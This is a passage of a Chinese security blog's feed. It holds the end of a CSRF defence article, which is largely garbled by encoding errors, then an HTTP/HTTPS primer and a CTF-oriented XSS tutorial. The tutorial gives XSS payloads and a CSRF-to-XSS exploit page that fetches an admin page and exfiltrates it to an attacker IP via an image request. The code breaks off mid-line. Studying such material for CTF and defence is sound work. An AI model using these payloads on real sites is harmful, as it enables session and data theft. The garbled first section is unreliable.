璇锋眰鏉ヨ锛岃鍦� form 鐨勬渶鍚庡姞涓� 锛岃繖鏍峰氨鎶� token 浠ュ弬鏁扮殑褰㈠紡鍔犲叆璇锋眰浜嗐€�</p><p><span data-type="text" style="color: var(--b3-font-color9);">浣嗘槸锛屽湪涓€涓綉绔欎腑锛屽彲浠ユ帴鍙楄姹傜殑鍦版柟闈炲父澶氾紝瑕佸浜庢瘡涓€涓姹傞兘鍔犱笂 token 鏄緢楹荤儲鐨勶紝骞朵笖寰堝鏄撴紡鎺夛紝閫氬父浣跨敤鐨勬柟娉曞氨鏄湪姣忔椤甸潰鍔犺浇鏃讹紝浣跨敤 javascript 閬嶅巻鏁翠釜 dom 鏍戯紝瀵逛簬 dom 涓墍鏈夌殑 a 鍜� form 鏍囩鍚庡姞鍏� token銆�</span></p><p>杩欐牱鍙互瑙ｅ喅澶ч儴鍒嗙殑璇锋眰锛屼絾鏄浜庡湪椤甸潰鍔犺浇涔嬪悗鍔ㄦ€佺敓鎴愮殑 html 浠ｇ爜锛岃繖绉嶆柟娉曞氨娌℃湁浣滅敤锛岃繕闇€瑕佺▼搴忓憳鍦ㄧ紪鐮佹椂鎵嬪姩娣诲姞 token銆�</p><p>璇ユ柟娉曡繕鏈変竴涓己鐐规槸闅句互淇濊瘉 token 鏈韩鐨勫畨鍏ㄣ€傜壒鍒槸鍦ㄤ竴浜涜鍧涗箣绫绘敮鎸佺敤鎴疯嚜宸卞彂琛ㄥ唴瀹圭殑缃戠珯锛岄粦瀹㈠彲浠ュ湪涓婇潰鍙戝竷鑷繁涓汉缃戠珯鐨勫湴鍧€銆傜敱浜庣郴缁熶篃浼氬湪杩欎釜鍦板潃鍚庨潰鍔犱笂 token锛岄粦瀹㈠彲浠ュ湪鑷繁鐨勭綉绔欎笂寰楀埌杩欎釜 token锛屽苟椹笂灏卞彲浠ュ彂鍔� CSRF 鏀诲嚮銆�</p><p><span data-type="text" style="color: var(--b3-font-color6);">涓轰簡閬垮厤杩欎竴鐐癸紝绯荤粺鍙互鍦ㄦ坊鍔� token 鐨勬椂鍊欏鍔犱竴涓垽鏂紝濡傛灉杩欎釜閾炬帴鏄摼鍒拌嚜宸辨湰绔欑殑锛屽氨鍦ㄥ悗闈㈡坊鍔� token锛屽鏋滄槸閫氬悜澶栫綉鍒欎笉鍔�</span></p><p>涓嶈繃锛屽嵆浣胯繖涓� csrftoken 涓嶄互鍙傛暟鐨勫舰寮忛檮鍔犲湪璇锋眰涔嬩腑锛岄粦瀹㈢殑缃戠珯涔熷悓鏍峰彲浠ラ€氳繃 Referer 鏉ュ緱鍒拌繖涓� token 鍊间互鍙戝姩 CSRF 鏀诲嚮銆傝繖涔熸槸涓€浜涚敤鎴峰枩娆㈡墜鍔ㄥ叧闂祻瑙堝櫒 Referer 鍔熻兘鐨勫師鍥犮€�</p><h3 id="3銆佸湪-HTTP-澶翠腑鑷畾涔夊睘鎬у苟楠岃瘉"><a href="#3銆佸湪-HTTP-澶翠腑鑷畾涔夊睘鎬у苟楠岃瘉" class="headerlink" title="3銆佸湪 HTTP 澶翠腑鑷畾涔夊睘鎬у苟楠岃瘉"></a>3銆佸湪 HTTP 澶翠腑鑷畾涔夊睘鎬у苟楠岃瘉</h3><p>杩欑鏂规硶涔熸槸浣跨敤 token 骞惰繘琛岄獙璇侊紝鍜屼笂涓€绉嶆柟娉曚笉鍚岀殑鏄紝杩欓噷骞朵笉鏄妸 token 浠ュ弬鏁扮殑褰㈠紡缃簬 HTTP 璇锋眰涔嬩腑锛岃€屾槸鎶婂畠鏀惧埌 HTTP 澶翠腑鑷畾涔夌殑灞炴€ч噷銆傞€氳繃 XMLHttpRequest 杩欎釜绫伙紝鍙互涓€娆℃€х粰鎵€鏈夎绫昏姹傚姞涓� csrftoken 杩欎釜 HTTP 澶村睘鎬э紝骞舵妸 token 鍊兼斁鍏ュ叾涓€�</p><p>杩欐牱瑙ｅ喅浜嗕笂绉嶆柟娉曞湪璇锋眰涓姞鍏� token 鐨勪笉渚匡紝鍚屾椂锛岄€氳繃XMLHttpRequest 璇锋眰鐨勫湴鍧€涓嶄細琚褰曞埌娴忚鍣ㄧ殑鍦板潃鏍忥紝涔熶笉鐢ㄦ媴蹇� token 浼氶€忚繃 Referer 娉勯湶鍒板叾浠栫綉绔欎腑鍘汇€�</p><blockquote><p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">鐒惰€岃繖绉嶆柟娉曠殑灞€闄愭€ч潪甯稿ぇ锛孹MLHttpRequest 璇锋眰閫氬父鐢ㄤ簬 Ajax 鏂规硶涓浜庨〉闈㈠眬閮ㄧ殑寮傛鍒锋柊锛屽苟闈炴墍鏈夌殑璇锋眰閮介€傚悎鐢ㄨ繖涓被鏉ュ彂璧凤紝鑰屼笖閫氳繃璇ョ被璇锋眰寰楀埌鐨勯〉闈笉鑳借娴忚鍣ㄦ墍璁板綍涓嬶紝浠庤€岃繘琛屽墠杩涳紝鍚庨€€锛屽埛鏂帮紝鏀惰棌绛夋搷浣滐紝缁欑敤鎴峰甫鏉ヤ笉渚裤€�</span></p></blockquote><p>鍙﹀锛屽浜庢病鏈夎繘琛� CSRF 闃叉姢鐨勯仐鐣欑郴缁熸潵璇达紝瑕侀噰鐢ㄨ繖绉嶆柟娉曟潵杩涜闃叉姢锛岃鎶婃墍鏈夎姹傞兘鏀逛负 XMLHttpRequest 璇锋眰锛岃繖鏍峰嚑涔庢槸瑕侀噸鍐欐暣涓綉绔欙紝杩欎唬浠锋棤鐤戞槸涓嶈兘鎺ュ彈鐨勩€�</p><h3 id="4銆侀獙璇�-HTTP-Referer-瀛楁"><a href="#4銆侀獙璇�-HTTP-Referer-瀛楁" class="headerlink" title="4銆侀獙璇� HTTP Referer 瀛楁"></a>4銆侀獙璇� HTTP Referer 瀛楁</h3><p>鏍规嵁 HTTP 鍗忚锛屽湪 HTTP 澶翠腑鏈変竴涓瓧娈靛彨Referer锛屽畠璁板綍浜嗚 HTTP 璇锋眰鐨勬潵婧愬湴鍧€銆傚湪閫氬父鎯呭喌涓嬶紝璁块棶涓€涓畨鍏ㄥ彈闄愰〉闈㈢殑璇锋眰鏉ヨ嚜浜庡悓涓€涓綉绔欙紝姣斿闇€瑕佽闂� 锛�</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;<span class="hljs-keyword">for</span>=Mallory<br></code></pre></td></tr></table></figure><p>鐢ㄦ埛蹇呴』鍏堢櫥闄� bank.example锛岀劧鍚庨€氳繃鐐瑰嚮椤甸潰涓婄殑鎸夐挳鏉ヨЕ鍙戣浆璐︿簨浠躲€�</p><p>杩欐椂锛岃杞笎璇锋眰鐨� Referer 鍊煎氨浼氭槸杞处鎸夐挳鎵€鍦ㄧ殑椤甸潰鐨� URL锛岄€氬父鏄互 bank.example 鍩熷悕寮€澶寸殑鍦板潃銆傝€屽鏋滈粦瀹㈣瀵归摱琛岀綉绔欏疄鏂� CSRF 鏀诲嚮锛屼粬鍙兘鍦ㄤ粬鑷繁鐨勭綉绔欐瀯閫犺姹傦紝褰撶敤鎴烽€氳繃榛戝鐨勭綉绔欏彂閫佽姹傚埌閾惰鏃讹紝璇ヨ姹傜殑 Referer 鏄寚鍚戦粦瀹㈣嚜宸辩殑缃戠珯銆�</p><p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">鍥犳锛岃闃插尽 CSRF 鏀诲嚮锛岄摱琛岀綉绔欏彧闇€瑕佸浜庢瘡涓€涓浆璐﹁姹傞獙璇佸叾 Referer 鍊硷紝濡傛灉鏄互 bank.example 寮€澶寸殑鍩熷悕锛屽垯璇存槑璇ヨ姹傛槸鏉ヨ嚜閾惰缃戠珯鑷繁鐨勮姹傦紝鏄悎娉曠殑銆傚鏋� Referer 鏄叾浠栫綉绔欑殑璇濓紝鍒欐湁鍙兘鏄粦瀹㈢殑 CSRF 鏀诲嚮锛屾嫆缁濊璇锋眰銆�</span></p><p>鈥�</p><p>杩欑鏂规硶鐨勬樉鑰屾槗瑙佺殑濂藉灏辨槸绠€鍗曟槗琛岋紝缃戠珯鐨勬櫘閫氬紑鍙戜汉鍛樹笉闇€瑕佹搷蹇� CSRF 鐨勬紡娲烇紝鍙渶瑕佸湪鏈€鍚庣粰鎵€鏈夊畨鍏ㄦ晱鎰熺殑璇锋眰缁熶竴澧炲姞涓€涓嫤鎴櫒鏉ユ鏌� Referer 鐨勫€煎氨鍙互銆傜壒鍒槸瀵逛簬褰撳墠鐜版湁鐨勭郴缁燂紝涓嶉渶瑕佹敼鍙樺綋鍓嶇郴缁熺殑浠讳綍宸叉湁浠ｇ爜鍜岄€昏緫锛屾病鏈夐闄╋紝闈炲父渚挎嵎銆�</p><p><span data-type="text" style="background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);">鐒惰€岋紝杩欑鏂规硶骞堕潪涓囨棤涓€澶便€俁eferer 鐨勫€兼槸鐢辨祻瑙堝櫒鎻愪緵鐨勶紝铏界劧 HTTP 鍗忚涓婃湁鏄庣‘鐨勮姹傦紝浣嗘槸姣忎釜娴忚鍣ㄥ浜� Referer 鐨勫叿浣撳疄鐜板彲鑳芥湁宸埆锛屽苟涓嶈兘淇濊瘉娴忚鍣ㄨ嚜韬病鏈夊畨鍏ㄦ紡娲炪€�</span></p><p>浣跨敤楠岃瘉 Referer 鍊肩殑鏂规硶锛屽氨鏄妸瀹夊叏鎬ч兘渚濊禆浜庣涓夋柟锛堝嵆娴忚鍣級鏉ヤ繚闅滐紝浠庣悊璁轰笂鏉ヨ锛岃繖鏍峰苟涓嶅畨鍏ㄣ€�</p><p>浜嬪疄涓婏紝瀵逛簬鏌愪簺娴忚鍣紝姣斿 IE6 鎴� FF2锛岀洰鍓嶅凡缁忔湁涓€浜涙柟娉曞彲浠ョ鏀� Referer 鍊笺€傚鏋� bank.example 缃戠珯鏀寔 IE6 娴忚鍣紝榛戝瀹屽叏鍙互鎶婄敤鎴锋祻瑙堝櫒鐨� Referer 鍊艰涓轰互 bank.example 鍩熷悕寮€澶寸殑鍦板潃锛岃繖鏍峰氨鍙互閫氳繃楠岃瘉锛屼粠鑰岃繘琛� CSRF 鏀诲嚮銆�</p><p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">鍗充究鏄娇鐢ㄦ渶鏂扮殑娴忚鍣紝榛戝鏃犳硶绡℃敼 Referer 鍊硷紝杩欑鏂规硶浠嶇劧鏈夐棶棰樸€傚洜涓� Referer 鍊间細璁板綍涓嬬敤鎴风殑璁块棶鏉ユ簮锛屾湁浜涚敤鎴疯涓鸿繖鏍蜂細渚电姱鍒颁粬浠嚜宸辩殑闅愮鏉冿紝鐗瑰埆鏄湁浜涚粍缁囨媴蹇� Referer 鍊间細鎶婄粍缁囧唴缃戜腑鐨勬煇浜涗俊鎭硠闇插埌澶栫綉涓€�</span></p><p>鍥犳锛岀敤鎴疯嚜宸卞彲浠ヨ缃祻瑙堝櫒浣垮叾鍦ㄥ彂閫佽姹傛椂涓嶅啀鎻愪緵 Referer銆傚綋浠栦滑姝ｅ父璁块棶閾惰缃戠珯鏃讹紝缃戠珯浼氬洜涓鸿姹傛病鏈� Referer 鍊艰€岃涓烘槸 CSRF 鏀诲嚮锛屾嫆缁濆悎娉曠敤鎴风殑璁块棶銆�</p><p>鎬荤粨<br>CSRF鏀诲嚮鏄敾鍑昏€呭埄鐢ㄧ敤鎴风殑韬唤鎿嶄綔鐢ㄦ埛璐︽埛鐨勪竴绉嶆敾鍑绘柟寮忋€傝璁SRF鐨勯槻寰℃柟妗堝繀椤诲厛鐞嗚ВCSRF鏀诲嚮鐨勫師鐞嗗拰鏈川銆傛垜浠€氬父浣跨敤Anti CSRF Token鏉ラ槻寰SRF鏀诲嚮锛屽湪浣跨敤Token鏃讹紝瑕佹敞鎰廡oken鐨勪繚瀵嗘€у拰闅忔満鎬с€�</p></script></iframe></image></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSRF</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP/HTTPS 简介</title>
    <link href="/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/"/>
    <url>/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP教程"><a href="#HTTP教程" class="headerlink" title="HTTP教程"></a>HTTP教程</h1><h1 id="HTTP-HTTPS-简介"><a href="#HTTP-HTTPS-简介" class="headerlink" title="HTTP&#x2F;HTTPS 简介"></a>HTTP&#x2F;HTTPS 简介</h1><p><strong>HTTP（超文本传输协议，Hypertext Transfer Protocol）</strong> 是一种用于从网络传输超文本到本地浏览器的传输协议。它定义了客户端与服务器之间请求和响应的格式。HTTP 工作在 TCP&#x2F;IP 模型之上，通常使用端口 80。</p><p><strong>HTTPS（超文本传输安全协议，Hypertext Transfer Protocol Secure）</strong> 是 HTTP 的安全版本，它在 HTTP 下增加了 SSL&#x2F;TLS 协议，提供了数据加密、完整性校验和身份验证。HTTPS 通常使用端口 443。</p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTP 协议是 Hyper Text Transfer Protocol（超文本传输协议）的缩写，是用于从万维网（ WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。</p><p>HTTP 是一个基于 TCP&#x2F;IP 通信协议来传递数据（HTML 文件、图片文件、查询结果等）。</p><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>HTTPS 协议是 HyperText Transfer Protocol Secure（超文本传输安全协议）的缩写，是一种通过计算机网络进行安全通信的传输协议。</p><p>HTTP 本身是不安全的，因为传输的数据未经加密，可能会被窃听或篡改，为了解决这个问题，引入了 HTTPS，即在 HTTP 上加入 SSL&#x2F;TLS 协议，为数据传输提供了加密和身份验证。</p><p>HTTPS 经由 HTTP 进行通信，但利用 SSL&#x2F;TLS 来加密数据包，HTTPS 开发的主要目的，是提供对网站服务器的身份认证，保护交换资料的隐私与完整性。</p><p>HTTP 的 URL 是由 http:&#x2F;&#x2F; 起始与默认使用端口 <strong>80</strong>，而 HTTPS 的 URL 则是由 https:&#x2F;&#x2F; 起始与默认使用端口<strong>443</strong>。</p><p><img src="/.com//image-20250520030430-xrcqvnk.png" alt="image"></p><h2 id="HTTP-工作原理"><a href="#HTTP-工作原理" class="headerlink" title="HTTP 工作原理"></a>HTTP 工作原理</h2><p>HTTP 协议工作于客户端-服务端架构上。</p><p>HTTP 工作过程通常如下：</p><ol><li><strong>客户端发起请求</strong>：用户通过客户端（如浏览器）输入 URL，客户端向服务器发起一个 <strong>HTTP 请求</strong>。</li><li><strong>服务器处理请求</strong>：服务器接收到请求后，根据<strong>请求的类型</strong>（如GET、POST等）和<strong>请求的资源</strong>，进行相应的处理。</li><li><strong>服务器返回响应</strong>：服务器将<strong>处理结果</strong>包装成<strong>HTTP响应</strong>消息，发送回客户端。</li><li><strong>客户端渲染页面</strong>：客户端接收到响应后，根据响应内容（如HTML、图片等）渲染页面，展示给用户。</li></ol><p>Web 服务器有：Nginx 服务器，Apache 服务器，IIS 服务器（Internet Information Services）等。</p><p>HTTP 默认端口号为 80，但是你也可以改为 8080 或者其他端口。</p><p><strong>HTTP 三点注意事项：</strong></p><ul><li>HTTP 是无连接：无连接的含义是<strong>限制每次连接</strong>只<strong>处理一个请求</strong>，服务器<strong>处理完客户的请求</strong>，并<strong>收到客户的应答</strong>后，即<strong>断开连接</strong>，采用这种方式可以<strong>节省传输时间</strong>。</li><li>HTTP 是<strong>媒体独立</strong>的：这意味着，只要<strong>客户端和服务器</strong>知道<strong>如何处理的数据内容</strong>，任何类型的数据都可以<strong>通过HTTP发送</strong>，客户端以及服务器指定使用<strong>适合的 MIME-type</strong> 内容类型。</li><li>HTTP 是<strong>无状态</strong>：HTTP 协议是<strong>无状态协议</strong>，无状态是指协议对于事务处理<strong>没有记忆能力</strong>，缺少状态意味着如果后续处理需要前面的信息，则它<strong>必须重传</strong>，这样可能导致每次连接传送的数据量增大，另一方面，在服务器不需要先前信息时它的应答就较快。</li></ul><p>以下图表展示了 HTTP 协议通信流程：</p><p><img src="/.com//image-20250520030441-6ak4ho7.png" alt="image"></p><hr><h2 id="HTTPS-作用"><a href="#HTTPS-作用" class="headerlink" title="HTTPS 作用"></a>HTTPS 作用</h2><p>HTTPS 的主要作用是在不安全的网络上创建一个<strong>安全信道</strong>，并可在使用<strong>适当的加密包</strong>和<strong>服务器证书</strong>可被验证且可被信任时，对<strong>窃听和中间人攻击</strong>提供合理的防护。</p><p>HTTPS 的信任基于预先安装在操作系统中的<strong>证书颁发机构（CA）</strong> 。</p><p>因此，与一个网站之间的 HTTPS 连线仅在这些情况下可被信任：</p><ul><li>浏览器正确地实现了 HTTPS 且操作系统中安装了正确且受信任的证书颁发机构；</li><li>证书颁发机构仅信任合法的网站；</li><li>被访问的网站提供了一个有效的证书，也就是说它是一个由操作系统信任的证书颁发机构签发的（大部分浏览器会对无效的证书发出警告）；</li><li>该证书正确地验证了被访问的网站（例如，访问 <a href="https://www.runoob.com/">https://www.runoob.com</a> 时收到了签发给 <a href="http://www.runoob.com/">www.runoob.com</a> 而不是其它域名的证书）；</li><li>此协议的加密层（SSL&#x2F;TLS）能够有效地提供认证和高强度的加密。</li></ul><p>Google Chrome、Internet Explorer 和 Firefox 等浏览器在网站含有由加密和未加密内容组成的混合内容时，会发出警告。</p><p>HTTP 链接显示不安全：</p><p><img src="/.com//image-20250520030456-1rj8505.png" alt="image"></p><p>HTTPS 链接显示为安全：</p><p><img src="/.com//image-20250520030504-od4iq6y.png" alt="image"></p><hr><h2 id="HTTP-与-HTTPS-区别"><a href="#HTTP-与-HTTPS-区别" class="headerlink" title="HTTP 与 HTTPS 区别"></a>HTTP 与 HTTPS 区别</h2><p>虽然 HTTP 和 HTTPS 在名称上非常相似，但它们在安全性上有本质的区别：HTTPS通过使用SSL&#x2F;TLS协议，为数据传输<strong>提供了加密和完整性校验</strong>，从而<strong>保护了用户的隐私和数据安全</strong>。随着网络安全意识的提高，越来越多的网站开始使用HTTPS来保护用户数据。</p><p><img src="/.com//image-20250520030518-m0ig9z5.png" alt="image"></p><p>同时，主流的浏览器和搜索引擎也在鼓励网站使用 HTTPS。</p><p>因此，对于涉及敏感信息传输的网站，建议使用 HTTPS 来提高安全性。</p><p>主要区别如下：</p><ul><li><p><strong>加密</strong>：</p><ul><li><strong>HTTP</strong>：数据传输过程中不加密，<strong>容易被截获和篡改</strong>。</li><li><strong>HTTPS</strong>：使用<strong>SSL&#x2F;TLS协议</strong>对传输的<strong>数据进行加密</strong>，保护<strong>数据传输过程中的安全性</strong>。</li></ul></li><li><p><strong>端口</strong>：</p><ul><li><strong>HTTP</strong>：默认使用端口80。</li><li><strong>HTTPS</strong>：默认使用端口443。</li></ul></li><li><p><strong>安全性</strong>：</p><ul><li><strong>HTTP</strong>：不提供数据加密，安全性较低。</li><li><strong>HTTPS</strong>：提供数据加密和完整性校验，安全性较高。</li></ul></li><li><p><strong>证书</strong>：</p><ul><li><strong>HTTP</strong>：不需要证书。</li><li><strong>HTTPS</strong>：需要<strong>SSL证书</strong>来启用加密，并验证服务器的身份。</li></ul></li><li><p><strong>性能</strong>：</p><ul><li><strong>HTTP</strong>：由于<strong>不加密数据</strong>，性能略高于HTTPS。</li><li><strong>HTTPS</strong>：由于需要进行<strong>加密和解密</strong>，可能会有一定的性能开销。</li></ul></li><li><p><strong>搜索引擎优化(SEO)</strong> ：</p><ul><li><strong>HTTP</strong>：搜索引擎可能会对<strong>没有使用HTTPS的网站进行降权</strong>。</li><li><strong>HTTPS</strong>：搜索引擎倾向于优先索引和展示使用HTTPS的网站。</li></ul></li><li><p><strong>浏览器显示</strong>：</p><ul><li><strong>HTTP</strong>：在大多数现代浏览器中，HTTP网站通常显示为 <strong>“不安全”</strong> 。</li><li><strong>HTTPS</strong>：浏览器会显示一个锁形图标，表示网站是安全的。</li></ul></li><li><p><strong>成本</strong>：</p><ul><li><strong>HTTP</strong>：通常免费。</li><li><strong>HTTPS</strong>：需要购买SSL证书，可能会有一定的成本。</li></ul></li><li><p><strong>应用场景</strong>：</p><ul><li><strong>HTTP</strong>：适用于<strong>不需要传输敏感信息</strong>的网站，如新闻网站、博客等。</li><li><strong>HTTPS</strong>：适用于<strong>需要传输敏感信息</strong>的网站，如网上银行、在线购物、电子邮件等。</li></ul></li></ul><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTTP</tag>
      
      <tag>HTTPS</tag>
      
      <tag>网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS跨站脚本攻击</title>
    <link href="/2024/05/20/Web/XSS/"/>
    <url>/2024/05/20/Web/XSS/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><blockquote><p>跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一种常见的 Web 漏洞，利用该漏洞，攻击者可以在受害者浏览器中注入并执行恶意脚本。在 CTF（Capture The Flag）竞赛中，XSS 攻击不仅是一种考察 Web 安全基础的攻击技术，同时也是非常实用的进阶手段，可以用来窃取敏感信息、绕过访问控制或结合 CSRF（跨站请求伪造）实现更复杂的链式攻击。</p><p>本文将介绍 XSS 攻击的基本原理、常见类型、如何在 CTF 中利用 XSS 攻击，以及防御措施。</p></blockquote><h3 id="一、XSS-攻击基本原理"><a href="#一、XSS-攻击基本原理" class="headerlink" title="一、XSS 攻击基本原理"></a>一、XSS 攻击基本原理</h3><h4 id="1-什么是-XSS？"><a href="#1-什么是-XSS？" class="headerlink" title="1. 什么是 XSS？"></a>1. 什么是 XSS？</h4><blockquote><p>XSS 攻击指的是攻击者通过在 Web 页面中注入恶意 JavaScript 代码，使得这些代码在其他用户的浏览器中执行。通过这种方式，攻击者可以篡改页面内容、窃取用户 Cookie、劫持用户会话，甚至对用户进行钓鱼攻击。</p></blockquote><h4 id="2-XSS-的类型"><a href="#2-XSS-的类型" class="headerlink" title="2. XSS 的类型"></a>2. XSS 的类型</h4><ul><li><p><strong>反射型 XSS（Reflected XSS）：</strong><br>攻击者将恶意脚本嵌入到请求中，目标服务器将其反射到响应中。例如，通过 URL 参数传入恶意代码，目标页面在渲染时执行了该代码。</p></li><li><p><strong>存储型 XSS（Stored XSS）：</strong><br>恶意代码被永久存储在服务器上（例如数据库、留言板），当其他用户访问包含该内容的页面时，恶意代码被执行。</p></li><li><p><strong>DOM 型 XSS：</strong><br>恶意代码完全在客户端执行，通过修改页面的 DOM 结构，攻击者利用 JavaScript 动态修改页面内容，从而引发 XSS 漏洞。</p></li></ul><p>‍</p><h3 id="二、CTF-中的-XSS-攻击"><a href="#二、CTF-中的-XSS-攻击" class="headerlink" title="二、CTF 中的 XSS 攻击"></a>二、CTF 中的 XSS 攻击</h3><blockquote><p>在 CTF 中，XSS 攻击通常不是为了破坏 Web 应用，而是为了获得 flag。CTF 赛题往往会设置一些特定的场景，例如存储型 XSS、反射型 XSS 或利用 CSRF 触发 XSS 链，以考察参赛者对 <a href="https://so.csdn.net/so/search?q=Web%20%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">Web 漏洞</a>利用链的理解和实践能力。</p></blockquote><p>‍</p><h4 id="1-反射型-XSS-示例"><a href="#1-反射型-XSS-示例" class="headerlink" title="1. 反射型 XSS 示例"></a>1. 反射型 XSS 示例</h4><p>在反射型 XSS 题目中，用户提交的输入（例如 URL 参数、表单数据）被直接反射到页面中。如果输入没有经过充分过滤，攻击者可以构造如下 URL：</p><p>​<code>http://example.com/search?query=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>​</p><p><a href="http://example.com/search?query=">http://example.com/search?query=</a><script>alert&#39;XSS&#39;)</script></p><h4 id="2-存储型-XSS-示例"><a href="#2-存储型-XSS-示例" class="headerlink" title="2. 存储型 XSS 示例"></a>2. 存储型 XSS 示例</h4><p>存储型 XSS 攻击中，攻击者提交的数据被存储在服务器上。当其他用户（例如管理员或特定用户）访问含有该数据的页面时，恶意代码会被执行。例如，攻击者在论坛留言中提交：</p><p>​<code>&lt;script&gt;alert(&#39;PWNED&#39;);&lt;/script&gt;</code>​</p><p>当管理员查看留言时，浏览器执行这段代码，攻击者可以利用此漏洞进一步窃取管理员信息或执行其他操作。</p><h4 id="3-CSRF-与-XSS-的结合"><a href="#3-CSRF-与-XSS-的结合" class="headerlink" title="3. CSRF 与 XSS 的结合"></a>3. CSRF 与 XSS 的结合</h4><p>CTF 题目中，有时会将 CSRF 与 XSS 攻击结合起来，形成攻击链。例如：</p><ul><li><p>利用 CSRF 诱使管理员访问一个恶意页面（由攻击者控制）。</p></li><li><p>恶意页面通过反射型 XSS 载荷，让管理员的浏览器执行 JavaScript 代码。</p></li><li><p>利用 JavaScript 内部的 fetch() 请求获取管理员专属的页面内容（例如包含 flag 的页面）。</p></li><li><p>最终将页面内容通过 exfiltration（数据外泄）的方式发送到攻击者服务器。</p></li></ul><p>这种 CSRF→XSS 链可以绕过 HttpOnly cookie 限制，因为一旦脚本在管理员浏览器中执行，它就能读取同源下的所有页面内容。</p><hr><h3 id="三、实战案例"><a href="#三、实战案例" class="headerlink" title="三、实战案例"></a>三、实战案例</h3><p>下面是一段示例代码，展示如何利用 CSRF-to-XSS 链来获取 flag。假设目标应用使用 Flask 开发，管理员的 flag 隐藏在一个草稿帖子中，只有在发布后才能完整显示，而管理员默认不会发布草稿。</p><p>攻击思路如下：</p><ol><li>利用 CSRF 让管理员的浏览器访问一个恶意页面（由攻击者托管）。</li><li>恶意页面反射 XSS 负载，利用 fetch() 请求目标页面（例如首页 &#x2F;），读取包含 flag 的 HTML 内容。</li><li>利用 new Image().src 将获取到的数据以 GET 请求形式 exfiltrate 到攻击者服务器。</li></ol><p><strong>示例恶意页面代码：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF to XSS Attack: Publish Admin Draft<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Triggering CSRF-to-XSS Attack<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// Construct the XSS payload.</span></span><br><span class="language-javascript">    <span class="hljs-comment">// Dynamically construct the closing tag to avoid breaking the script.</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> payload = <span class="hljs-string">`&lt;scr`</span> + <span class="hljs-string">`ipt&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">      // Use fetch() to retrieve the protected page (which now shows the full flag).</span></span><br><span class="hljs-string"><span class="language-javascript">      fetch(&quot;http://challenge.localhost/&quot;, &#123; credentials: &quot;include&quot; &#125;)</span></span><br><span class="hljs-string"><span class="language-javascript">        .then(response =&gt; response.text())</span></span><br><span class="hljs-string"><span class="language-javascript">        .then(data =&gt; &#123;</span></span><br><span class="hljs-string"><span class="language-javascript">          // Exfiltrate the data to the attacker&#x27;s server.</span></span><br><span class="hljs-string"><span class="language-javascript">          var exfilUrl = &quot;http://10.17.108.216:8888/?flag=&quot; + encodeURIComponent(data);</span></span><br><span class="hljs-string"><span class="language-javascript">          new Image().src = exfilUrl;</span></span><br><span class="hljs-string"><span class="language-javascript">        &#125;)</span></span><br><span class="hljs-string"><span class="language-javascript">        .catch(error =&gt; console.error(&quot;Fetch error:&quot;, error));</span></span><br><span class="hljs-string"><span class="language-javascript">    &lt;/scr`</span> + <span class="hljs-string">`ipt&gt;`</span>;</span><br><span class="language-javascript">    </span><br><span class="language-javascript">    <span class="hljs-comment">// URL-encode the payload.</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> encodedPayload = <span class="hljs-built_in">encodeURIComponent</span>(payload);</span><br><span class="language-javascript">    <span class="hljs-comment">// Build the target URL 